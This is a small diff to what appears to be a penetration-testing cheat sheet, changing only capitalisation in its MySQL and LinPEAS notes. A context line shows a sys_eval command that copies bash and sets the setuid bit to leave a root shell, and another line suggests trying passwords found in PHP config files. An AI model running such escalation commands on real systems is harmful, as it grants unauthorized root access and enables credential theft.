@@ -1181,7 +1181,7 @@ Victim Machine
 
 ### Mysql
 
-Prequisites - a valid database
+prequisites - a valid database
 
 ```
 show databases;
@@ -1201,4 +1201,4 @@ select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
 
 ### Run LinPEAS
 
-Try passwords found in config PHP files
+try passwords found in config PHP files
